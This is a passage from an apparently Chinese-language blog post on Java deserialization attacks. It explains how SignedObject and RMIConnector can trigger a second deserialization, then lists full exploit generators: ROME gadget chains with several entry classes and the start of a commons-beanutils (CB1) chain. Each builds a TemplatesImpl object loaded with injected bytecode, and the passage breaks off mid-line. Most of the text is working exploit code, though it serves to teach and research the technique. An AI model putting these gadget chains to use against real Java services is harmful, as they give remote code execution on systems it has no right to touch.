kpg.generateKeyPair();</span><br><span class="line"><span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(待反序列化对象, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br></pre></td></tr></table></figure><h2 id="RMIConnector"><a href="#RMIConnector" class="headerlink" title="RMIConnector"></a>RMIConnector</h2><p>RMIConnector#findRMIServerJRMP会把传入的base64参数反序列化<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700463843592-444eea2a-e4d9-46ac-a0cc-93cf2c24ee08.png" alt="image.png"><br>RMIConnector#findRMIServer，如果path以”&#x2F;stub&#x2F;“开头，就会调用findRMIServerJRMP<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700464302536-37dc76bf-eea4-4b5f-8bfc-1843e42cd6c3.png" alt="image.png"><br>RMIConnector#connect，会调用findRMIServer，注意rmiServer要为null<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/1700464573798-ac8302b4-e693-4781-a78c-69cfb68b8d4c.png" alt="image.png"><br>把待反序列化对象Base64编码拼接到URL后面，将问题转换成调RMIConnector#connect。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JMXServiceURL</span> <span class="variable">jmxServiceURL</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://&quot;</span>);  <span class="comment">// 固定写法，不然创建不了</span></span><br><span class="line">setFieldValue(jmxServiceURL, <span class="string">&quot;urlPath&quot;</span>, <span class="string">&quot;/stub/待反序列化对象&quot;</span>);</span><br><span class="line"><span class="type">RMIConnector</span> <span class="variable">rmiConnector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIConnector</span>(jmxServiceURL, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><h2 id="触发SignedObject-getObject"><a href="#触发SignedObject-getObject" class="headerlink" title="触发SignedObject#getObject"></a>触发SignedObject#getObject</h2><ul><li>ROME链<ul><li>HashMap入口类</li><li>HashTable入口类</li><li>badAttributeValueExpException入口类</li><li>HashMap+HotSwappableTargetSource类</li></ul></li><li>CB1链<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="comment">//        SerialUtils.serialize(hashMap);</span></span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashtable);</span><br><span class="line"><span class="comment">//        SerialUtils.unserialize();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEBadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(badAttributeValueExpException);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>这个ROME链，需要SpringBoot依赖。<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHotSwappableTargetSource</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) getEvilObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">KeyPairGenerator</span> <span class="variable">kpg</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        kpg.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">kp</span> <span class="operator">=</span> kpg.generateKeyPair();</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(evilObject, kp.getPrivate(), Signature.getInstance(<span class="string">&quot;DSA&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class,signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(toStringBean);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;jasper&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashMap);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// here can be CC object or others need to deserialize.</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getEvilObject</span><span class="params">()</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>下面需要有CB依赖（1.9.4），本质是利用CB链调用任意getter，进而调用SignedObject#getObject<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SignedObject;</span><br><span class="line"><span class="keyword">import</span> Utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> Utils.SerialUtils;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPair;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyPairGenerator;</span><br><span class="line"><span class="keyword">import</span> java.security.Signature;</span><br><span class="line"><span class="keyword">import</span> java.security.SignedObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;Object,Object&gt; evilObject = (HashMap&lt;Object, Object&gt;) 